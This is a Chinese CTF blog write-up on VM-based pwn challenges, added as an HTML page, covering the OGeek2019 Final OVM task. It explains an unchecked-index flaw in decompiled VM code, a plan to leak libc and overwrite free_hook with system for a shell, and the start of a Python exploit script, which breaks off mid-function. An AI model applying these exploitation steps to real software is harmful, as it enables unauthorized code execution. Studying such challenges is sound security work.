@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言：好久没有更新博客了，关于vm的学习也是断断续续的，只见识了几道题目，但是还是想总结一下，所谓vmpwn就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也就是说一些汇编命令通过一些函数来实现，而大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西等等….. 以下是vmpwn的一些简单的题目，但是有些很复杂的题目需要很强的逆向能力，慢慢的分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vmpwn小总结">
+<meta property="og:url" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="前言：好久没有更新博客了，关于vm的学习也是断断续续的，只见识了几道题目，但是还是想总结一下，所谓vmpwn就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也就是说一些汇编命令通过一些函数来实现，而大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西等等….. 以下是vmpwn的一些简单的题目，但是有些很复杂的题目需要很强的逆向能力，慢慢的分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221007847-1277360936.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221338411-416369404.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221706543-416530255.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221949071-1042397994.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223127910-1935792498.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223415143-1050529184.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223719357-549222091.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224356838-659812714.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224645956-442285452.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212225519456-1239240624.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230907806-826221916.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230837520-618409823.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231207168-659364568.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231657814-824395369.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212232226004-739893075.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154412467-223727277.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154536714-1643444929.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154646693-2054037180.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160329097-963325194.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160627536-2044709315.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213161433224-83474805.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213162038357-1490745944.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163226582-874674569.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163821570-2125481947.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164717866-432455765.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164536776-2043531085.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164659199-432134688.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164816886-1092033078.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213165010512-1055607648.png">
+<meta property="article:published_time" content="2024-12-13T09:00:50.000Z">
+<meta property="article:modified_time" content="2024-12-13T09:01:15.239Z">
+<meta property="article:author" content="CH13hh">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221007847-1277360936.png">
+  
+  
+  
+  <title>vmpwn小总结 - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vmpwn小总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-13 17:00" pubdate>
+          2024年12月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vmpwn小总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h2><p>好久没有更新博客了，关于vm的学习也是断断续续的，只见识了几道题目，但是还是想总结一下，所谓vmpwn就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也就是说一些汇编命令通过一些函数来实现，而大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西等等…..</p>
+<p>以下是vmpwn的一些简单的题目，但是有些很复杂的题目需要很强的逆向能力，慢慢的分析</p>
+<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>保护策略</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221007847-1277360936.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>ida逆向</p>
+<p>PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。 SP 指针寄存器，永远指向当前的栈顶。</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221338411-416369404.png" srcset="/img/loading.gif" lazyload alt="img">、</p>
+<p>通过我们输入的代码指令来操作的，也就是接下来的code</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221706543-416530255.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而紧接着就是对我们输入的code进行处理具体在 execute函数中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+19h] [rbp-7h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+1Ah] [rbp-6h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><span class="hljs-comment">//这里将字节分为4给部分，分别是v4,v3,v2和高位 </span><br>  v4 = (a1 &amp; <span class="hljs-number">0xF0000</span>u) &gt;&gt; <span class="hljs-number">16</span>;<br>  v3 = (<span class="hljs-type">unsigned</span> __int16)(a1 &amp; <span class="hljs-number">0xF00</span>) &gt;&gt; <span class="hljs-number">8</span>;<br>  v2 = a1 &amp; <span class="hljs-number">0xF</span>;<br>  result = HIBYTE(a1); <span class="hljs-comment">//这里取高字节进行匹配</span><br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x70</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = reg[v2] + reg[v3];                <span class="hljs-comment">// 加法</span><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x70</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xB0</span> )<br>    &#123;<br>      result = (<span class="hljs-type">ssize_t</span>)reg;<br>      reg[v4] = reg[v2] ^ reg[v3];              <span class="hljs-comment">// 异或</span><br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xB0</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xD0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = (<span class="hljs-type">int</span>)reg[v3] &gt;&gt; reg[v2];      <span class="hljs-comment">// 右移</span><br>        <span class="hljs-keyword">return</span> result;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xD0</span>u )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xE0</span> )<br>        &#123;<br>          running = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( !reg[<span class="hljs-number">13</span>] )<br>            <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXIT\n&quot;</span>, <span class="hljs-number">5uLL</span>);    <span class="hljs-comment">// 栈空退出</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) != <span class="hljs-number">0xFF</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        running = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;R%d: %X\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)reg[i]);<span class="hljs-comment">// 打印数据</span><br>        <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HALT\n&quot;</span>, <span class="hljs-number">5uLL</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xC0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = reg[v3] &lt;&lt; reg[v2];           <span class="hljs-comment">// 左移</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x90</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] &amp; reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA0</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] | reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x80</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v3] - reg[v2];<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x30</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = memory[reg[v2]];<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x30</span>u )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x50</span>u:<br>        LODWORD(result) = reg[<span class="hljs-number">13</span>];<br>        reg[<span class="hljs-number">13</span>] = result + <span class="hljs-number">1</span>;<br>        result = (<span class="hljs-type">int</span>)result;<br>        <span class="hljs-built_in">stack</span>[(<span class="hljs-type">int</span>)result] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x60</span>u:<br>        --reg[<span class="hljs-number">13</span>];<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = <span class="hljs-built_in">stack</span>[reg[<span class="hljs-number">13</span>]];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x40</span>u:<br>        result = (<span class="hljs-type">ssize_t</span>)memory;<br>        memory[reg[v2]] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x10</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (<span class="hljs-type">unsigned</span> __int8)a1;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x20</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (_BYTE)a1 == <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221949071-1042397994.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里我们输入的pc给了reg[15]，每次循环进行匹配+1，然后进行进行处理也就是刚刚上面的代码逻辑</p>
+<p>这里可以用python来看看到底取了什么（当然因为我代码基础比较弱….）</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223127910-1935792498.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>那么看到取到的其实2，3，4也就是v4,v3,v2。</p>
+<p>然后继续分析</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223415143-1050529184.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>那么这里不难看出就是通过v2,v3来当作下标取reg数组进行索引的</p>
+<p>但是没有对下标进行限制那么就是可以输入负数来造成恶意数据的修改等等</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223719357-549222091.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>0x30和0x40，这里分别是取memory的值给reg，和取reg的值给memory，但是这期间它们的下标我们都可以自己控制</p>
+<p>同时还有这个</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224356838-659812714.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>我们可以向reg里面进行赋值和取出值</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224645956-442285452.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里打印reg里面的值，但是是4位一组</p>
+<p>最后会调用free把我们输入东西进行free，那么如果我们把free_hook给修改成system那么就可以通过输入&#x2F;bin&#x2F;sh来获取shell</p>
+<p>那么就需要得到一个libc地址，正好前面可以通过负数下标来将一个libc地址存入reg输入，然后进行打印泄露地址</p>
+<p>这里可以把相关的函数包装一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xb0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xd0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readn</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x30</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span 